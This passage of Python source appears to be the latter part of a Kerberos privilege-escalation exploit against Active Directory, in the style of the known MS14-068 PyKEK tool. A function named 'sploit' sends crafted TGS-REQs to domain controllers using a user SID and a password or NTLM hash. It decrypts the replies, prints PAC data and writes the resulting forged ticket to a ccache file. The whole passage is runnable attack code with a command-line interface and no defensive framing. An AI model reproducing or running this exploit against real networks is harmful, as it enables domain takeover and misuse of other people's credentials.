    sys.stderr.write(f'  [+] Sending TGS-REQ to {kdc_a}...')
    sys.stderr.flush()
    sock = send_req(tgs_req, kdc_a)
    sys.stderr.write(' Done!\n')

    sys.stderr.write(f'  [+] Receiving TGS-REP from {kdc_a}...')
    sys.stderr.flush()
    data = recv_rep(sock)
    sys.stderr.write(' Done!\n')

    sys.stderr.write(f'  [+] Parsing TGS-REP from {kdc_a}...')
    tgs_rep, tgs_rep_enc = decrypt_tgs_rep(data, subkey)
    session_key2 = (int(tgs_rep_enc['key']['keytype']), tgs_rep_enc['key']['keyvalue'])
    tgt_b = tgs_rep['ticket']
    sys.stderr.write(' Done!\n')

    if trust_ab_key is not None:
        pretty_print_pac(pac[1])
        print(tgs_rep.prettyPrint(), file=sys.stderr)
        print(tgs_rep_enc.prettyPrint(), file=sys.stderr)
        ticket_debug(tgt_b, trust_ab_key)

    if target_service and target_host and kdc_b:
        sys.stderr.write(f'  [+] Building TGS-REQ for {kdc_b}...')
        sys.stderr.flush()
        subkey = generate_subkey()
        nonce = getrandbits(31)
        current_time = time()
        tgs_req2 = build_tgs_req(target_realm, target_service, target_host, user_realm, user_name,
                                 tgt_b, session_key2, subkey, nonce, current_time)
        sys.stderr.write(' Done!\n')

        sys.stderr.write(f'  [+] Sending TGS-REQ to {kdc_b}...')
        sys.stderr.flush()
        sock = send_req(tgs_req2, kdc_b)
        sys.stderr.write(' Done!\n')

        sys.stderr.write(f'  [+] Receiving TGS-REP from {kdc_b}...')
        sys.stderr.flush()
        data = recv_rep(sock)
        sys.stderr.write(' Done!\n')

        sys.stderr.write(f'  [+] Parsing TGS-REP from {kdc_b}...')
        tgs_rep2, tgs_rep_enc2 = decrypt_tgs_rep(data, subkey)
        sys.stderr.write(' Done!\n')
    else:
        tgs_rep2 = tgs_rep
        tgs_rep_enc2 = tgs_rep_enc

    sys.stderr.write(f'  [+] Creating ccache file {output_filename!r}...')
    cc = CCache((user_realm, user_name))
    tgs_cred = kdc_rep2ccache(tgs_rep2, tgs_rep_enc2)
    cc.add_credential(tgs_cred)
    cc.save(output_filename)
    sys.stderr.write(' Done!\n')

    if target_key is not None:
        print(tgs_rep2.prettyPrint(), file=sys.stderr)
        print(tgs_rep_enc2.prettyPrint(), file=sys.stderr)
        ticket_debug(tgs_rep2['ticket'], target_key)


def ticket_debug(ticket, key):
    try:
        ticket_enc = decrypt_ticket_enc_part(ticket, key)
        print(ticket.prettyPrint(), file=sys.stderr)
        for ad in iter_authorization_data(ticket_enc['authorization-data']):
            print(f'AUTHORIZATION-DATA (type: {ad["ad-type"]}):', file=sys.stderr)
            if ad['ad-type'] == AD_WIN2K_PAC:
                pretty_print_pac(ad['ad-data'])
            else:
                print(binascii.hexlify(ad['ad-data']), file=sys.stderr)
    except Exception as e:
        print('ERROR:', e, file=sys.stderr)


if __name__ == '__main__':
    def usage_and_exit():
        print('USAGE:', file=sys.stderr)
        print(f'{sys.argv[0]} -u <userName>@<domainName> -s <userSid> -d <domainControlerAddr>', file=sys.stderr)
        print('\nOPTIONS:', file=sys.stderr)
        print('    -p <clearPassword>', file=sys.stderr)
        print(' --rc4 <ntlmHash>', file=sys.stderr)
        sys.exit(1)

    opts, args = getopt(sys.argv[1:], 'u:s:d:p:', ['rc4='])
    opts = dict(opts)
    if not all(k in opts for k in ('-u', '-s', '-d')):
        usage_and_exit()

    user_name, user_realm = opts['-u'].split('@', 1)
    user_sid = opts['-s']
    kdc_a = opts['-d']

    if '--rc4' in opts:
        user_key = (RC4_HMAC, binascii.unhexlify(opts['--rc4']))
        assert len(user_key[1]) == 16
    elif '-p' in opts:
        user_key = (RC4_HMAC, ntlm_hash(opts['-p']).digest())
    else:
        user_key = (RC4_HMAC, ntlm_hash(getpass('Password: ')).digest())

    target_realm = user_realm.upper()
    target_service = target_host = kdc_b = None
    filename = f'TGT_{user_name}@{user_realm}.ccache'

    sploit(user_realm.upper(), user_name, user_sid, user_key, kdc_a, kdc_b,
           target_realm, target_service, target_host, filename)


